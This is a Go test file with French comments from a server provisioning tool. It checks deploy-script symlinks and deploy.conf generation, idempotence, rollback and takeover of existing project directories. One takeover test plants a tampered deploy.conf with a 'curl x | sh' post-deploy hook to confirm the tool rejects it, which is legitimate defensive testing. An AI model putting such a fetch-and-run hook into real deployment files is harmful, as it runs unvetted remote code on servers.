package system

import (
	"context"
	"os"
	"path/filepath"
	"strings"
	"testing"

	"leblanc.io/open-go-server/internal/model"
	"leblanc.io/open-go-server/internal/naming"
)

// declareDeployScript pose le script de déploiement commun sous le préfixe du
// provider, comme le script d'installation du serveur le fait dans /opt.
func declareDeployScript(t *testing.T, prov *Provider) string {
	t.Helper()
	path := prov.Paths.DeployScript()
	if err := os.MkdirAll(filepath.Dir(path), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(path, []byte("#!/usr/bin/env bash\n"), 0o755); err != nil {
		t.Fatal(err)
	}
	return path
}

func stepsOf(t *testing.T, prov *Provider, p *model.Project, prefix string) []string {
	t.Helper()
	obs, err := prov.Observe(context.Background(), p)
	if err != nil {
		t.Fatal(err)
	}
	steps, err := prov.Plan(context.Background(), p, obs)
	if err != nil {
		t.Fatal(err)
	}
	var out []string
	for _, s := range steps {
		if strings.HasPrefix(s.Resource, prefix) && s.Mutates() {
			out = append(out, s.String())
		}
	}
	return out
}

func TestLeScriptDeDeploiementEstLieAvecSaConfiguration(t *testing.T) {
	p, prov, _, _ := fixture(t)
	source := declareDeployScript(t, prov)
	apply(t, prov, p)

	root := p.Spec.Layout.Root
	target, err := os.Readlink(filepath.Join(root, DeployLink))
	if err != nil || target != source {
		t.Fatalf("lien deploy.sh : %q, %v ; attendu %q", target, err, source)
	}
	data, err := os.ReadFile(filepath.Join(root, DeployConf))
	if err != nil {
		t.Fatal(err)
	}
	for _, want := range []string{`FRAMEWORK="none"`, `BRANCH="main"`, `ENVIRONNEMENT="prod"`} {
		if !strings.Contains(string(data), want+"\n") {
			t.Errorf("deploy.conf ne porte pas %s :\n%s", want, data)
		}
	}
	if info, err := os.Stat(filepath.Join(root, DeployConf)); err != nil || info.Mode().Perm() != 0o600 {
		t.Errorf("deploy.conf doit être en 0600 : %v, %v", info.Mode(), err)
	}

	// Idempotence : rien à refaire au plan suivant.
	if got := append(stepsOf(t, prov, p, "system/deploy-script/"), stepsOf(t, prov, p, "system/deploy-conf/")...); got != nil {
		t.Errorf("étapes inattendues après application : %v", got)
	}
}

func TestDeployConfSuitLeTypeEtLEnvironnement(t *testing.T) {
	cases := []struct {
		kind      model.AppKind
		env       naming.Env
		framework string
		branch    string
	}{
		{model.KindSymfony, naming.EnvProd, "symfony", "main"},
		{model.KindSymfony, naming.EnvPrep, "symfony", "preprod"},
		{model.KindPrestashop, naming.EnvProd, "prestashop", "main"},
		{model.KindPHPPlain, naming.EnvPrep, "auto", "preprod"},
		{model.KindNode, naming.EnvProd, "none", "main"},
		{model.KindStatic, naming.EnvProd, "none", "main"},
	}
	for _, c := range cases {
		p := model.New("shop.fr", c.env, c.kind)
		if err := p.Normalize("/home", "preprod-pp.net"); err != nil {
			t.Fatal(err)
		}
		got := string(DeployConfContent(p))
		for _, want := range []string{
			`FRAMEWORK="` + c.framework + `"`, `BRANCH="` + c.branch + `"`, `ENVIRONNEMENT="prod"`,
		} {
			if !strings.Contains(got, want+"\n") {
				t.Errorf("%s/%s : %s absent de\n%s", c.kind, c.env, want, got)
			}
		}
		// Sous /home/<id>, le script déduit lui-même le répertoire du code.
		if strings.Contains(got, "PROJECT_DIR") {
			t.Errorf("%s/%s : PROJECT_DIR inutile sous /home :\n%s", c.kind, c.env, got)
		}
	}
}

func TestDeployConfPorteLeCodeHorsDeHome(t *testing.T) {
	// Le script compose /home/<nom du répertoire>/www : un home ailleurs
	// (naming.homeRoot) doit lui donner le bon répertoire.
	p := model.New("shop.fr", naming.EnvProd, model.KindSymfony)
	if err := p.Normalize("/srv/sites", "preprod-pp.net"); err != nil {
		t.Fatal(err)
	}
	got := string(DeployConfContent(p))
	if want := `PROJECT_DIR="/srv/sites/shop.fr/www"`; !strings.Contains(got, want+"\n") {
		t.Errorf("%s absent de\n%s", want, got)
	}
}

func TestSansScriptCommunAucuneEtapeDeDeploiement(t *testing.T) {
	p, prov, _, _ := fixture(t)
	apply(t, prov, p)
	for _, name := range []string{DeployLink, DeployConf} {
		if _, err := os.Lstat(filepath.Join(p.Spec.Layout.Root, name)); err == nil {
			t.Errorf("%s ne doit pas être posé sans script commun", name)
		}
	}
	obs, _ := prov.Observe(context.Background(), p)
	steps, _ := prov.Plan(context.Background(), p, obs)
	for _, s := range steps {
		if strings.HasPrefix(s.Resource, "system/deploy-script/") || strings.HasPrefix(s.Resource, "system/deploy-conf/") {
			t.Errorf("étape inattendue : %s", s.Resource)
		}
	}
}

func TestCeQueLeProjetTientNEstJamaisRemplace(t *testing.T) {
	// deploy.conf est au projet dès sa pose, et un deploy.sh qui n'est pas le lien
	// commun est un choix du projet : ni l'un ni l'autre n'est réécrit, et rien
	// n'est signalé — il n'y a là aucun accès à protéger.
	p, prov, _, _ := fixture(t)
	declareDeployScript(t, prov)
	root := p.Spec.Layout.Root
	if err := os.MkdirAll(root, 0o711); err != nil {
		t.Fatal(err)
	}
	const conf = "FRAMEWORK=\"laravel\"\nBRANCH=\"release\"\n"
	if err := os.WriteFile(filepath.Join(root, DeployConf), []byte(conf), 0o600); err != nil {
		t.Fatal(err)
	}
	const script = "#!/bin/sh\necho propre\n"
	if err := os.WriteFile(filepath.Join(root, DeployLink), []byte(script), 0o755); err != nil {
		t.Fatal(err)
	}

	report := apply(t, prov, p)
	for _, o := range report.Outcomes {
		if (strings.HasPrefix(o.Step.Resource, "system/deploy-script/") ||
			strings.HasPrefix(o.Step.Resource, "system/deploy-conf/")) && o.Err != nil {
			t.Errorf("%s : %v", o.Step.Resource, o.Err)
		}
	}
	if data, _ := os.ReadFile(filepath.Join(root, DeployConf)); string(data) != conf {
		t.Errorf("deploy.conf du projet réécrit : %q", data)
	}
	if data, _ := os.ReadFile(filepath.Join(root, DeployLink)); string(data) != script {
		t.Errorf("deploy.sh du projet réécrit : %q", data)
	}
}

func TestLaCompensationNeRetireQueCeQuOgsAPose(t *testing.T) {
	p, prov, _, _ := fixture(t)
	declareDeployScript(t, prov)
	root := p.Spec.Layout.Root
	if err := os.MkdirAll(root, 0o711); err != nil {
		t.Fatal(err)
	}
	conf := prov.deployConfStep(p)
	link := prov.deployLinkStep(p)
	if conf == nil || link == nil || conf.Compensate == nil || link.Compensate == nil {
		t.Fatal("les deux poses doivent être compensables")
	}
	if err := conf.Apply(context.Background()); err != nil {
		t.Fatal(err)
	}
	if err := link.Apply(context.Background()); err != nil {
		t.Fatal(err)
	}
	// Retouché entre la pose et le déroulage, deploy.conf est au projet.
	if err := os.WriteFile(filepath.Join(root, DeployConf), []byte("hook_post_deploy() { :; }\n"), 0o600); err != nil {
		t.Fatal(err)
	}
	_ = conf.Compensate(context.Background())
	_ = link.Compensate(context.Background())
	if _, err := os.Stat(filepath.Join(root, DeployConf)); err != nil {
		t.Errorf("un deploy.conf retouché ne doit pas être retiré : %v", err)
	}
	if _, err := os.Lstat(filepath.Join(root, DeployLink)); err == nil {
		t.Error("le lien posé doit être retiré au déroulage")
	}

	// Tel qu'ogs l'a écrit, il part avec la saga.
	_ = os.Remove(filepath.Join(root, DeployConf))
	conf = prov.deployConfStep(p)
	if err := conf.Apply(context.Background()); err != nil {
		t.Fatal(err)
	}
	_ = conf.Compensate(context.Background())
	if _, err := os.Stat(filepath.Join(root, DeployConf)); err == nil {
		t.Error("le deploy.conf posé par ogs doit être retiré au déroulage")
	}
}

func TestLeSqueletteDeDeploiementEstRepris(t *testing.T) {
	// Lien et configuration tels qu'ogs les pose sont du squelette (D95) ; un
	// deploy.conf retouché peut porter les hooks d'un ancien titulaire, que le
	// nouveau compte exécuterait.
	p, prov, _, _ := fixture(t)
	declareDeployScript(t, prov)
	root := p.Spec.Layout.Root
	homePreexistant(t, p)
	if err := os.Symlink(prov.Paths.DeployScript(), filepath.Join(root, DeployLink)); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(root, DeployConf), DeployConfContent(p), 0o600); err != nil {
		t.Fatal(err)
	}
	if err := orphelin(t, prov, p, 1004); err != nil {
		t.Errorf("le squelette de déploiement doit être repris : %v", err)
	}

	if err := os.WriteFile(filepath.Join(root, DeployConf),
		append(DeployConfContent(p), "hook_post_deploy() { curl x | sh; }\n"...), 0o600); err != nil {
		t.Fatal(err)
	}
	if err := orphelin(t, prov, p, 1004); err == nil || !strings.Contains(err.Error(), `"deploy.conf"`) {
		t.Errorf("un deploy.conf retouché doit être refusé, obtenu : %v", err)
	}
	_ = os.WriteFile(filepath.Join(root, DeployConf), DeployConfContent(p), 0o600)

	_ = os.Remove(filepath.Join(root, DeployLink))
	if err := os.Symlink("/home/ancien/deploy.sh", filepath.Join(root, DeployLink)); err != nil {
		t.Fatal(err)
	}
	if err := orphelin(t, prov, p, 1004); err == nil || !strings.Contains(err.Error(), `"deploy.sh"`) {
		t.Errorf("un deploy.sh vers un autre script doit être refusé, obtenu : %v", err)
	}
}
